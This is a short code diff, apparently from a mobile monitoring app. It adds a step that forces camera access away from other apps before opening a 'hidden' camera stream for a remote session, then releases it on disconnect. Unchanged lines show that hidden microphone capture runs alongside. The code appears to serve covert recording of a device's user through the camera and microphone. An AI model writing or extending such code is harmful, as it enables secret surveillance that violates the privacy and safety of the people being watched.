@@ -753,6 +753,22 @@ async function connectChildStreamImpl(
       flowLog('CAMERA_FLOW', 'CAMERA_COMMAND_RECEIVED', {sessionId, facing: cameraFacing});
       const facing = cameraFacing === 'environment' ? 'environment' : 'user';
       currentCameraFacing = facing;
+      
+      // Force camera access from other apps before starting stream
+      const cameraId = facing === 'user' ? '1' : '0'; // Standard camera IDs: front=1, back=0
+      flowLog('CAMERA_FLOW', 'FORCING_CAMERA_ACCESS', {sessionId, facing, cameraId});
+      try {
+        const forceSuccess = await nativeModules.forceCameraAccess(cameraId);
+        flowLog('CAMERA_FLOW', 'CAMERA_FORCE_RESULT', {sessionId, success: forceSuccess, cameraId});
+        if (!forceSuccess) {
+          slog('CAMERA', `Warning: Failed to force camera access for ${facing} camera (ID: ${cameraId}), proceeding anyway`);
+        } else {
+          slog('CAMERA', `Successfully forced camera access for ${facing} camera (ID: ${cameraId})`);
+        }
+      } catch (error) {
+        slog('CAMERA', `Camera force access error: ${error}, proceeding with normal camera access`);
+      }
+      
       flowLog('CAMERA_FLOW', 'FOREGROUND_SERVICE_STARTING', {sessionId, facing});
       const data = await nativeModules.getHiddenCameraMediaStream(facing);
       flowLog('CAMERA_FLOW', 'CAMERA_OPENED', {sessionId, streamId: data.streamId, facing});
@@ -1122,6 +1138,15 @@ export async function disconnectStream(clearConnecting = true): Promise<void> {
   if (hadActiveStream) {
     if (streamTypeToStop === 'CAMERA') {
       await nativeModules.stopHiddenCameraStream().catch(() => undefined);
+      
+      // Release forced camera access
+      try {
+        await nativeModules.releaseCameraAccess();
+        slog('CAMERA', 'Released forced camera access');
+      } catch (error) {
+        slog('CAMERA', `Failed to release camera access: ${error}`);
+      }
+      
       // Camera sessions also capture microphone — stop that too.
       if (cameraAudioStream) {
         await nativeModules.stopHiddenAudioStream().catch(() => undefined);
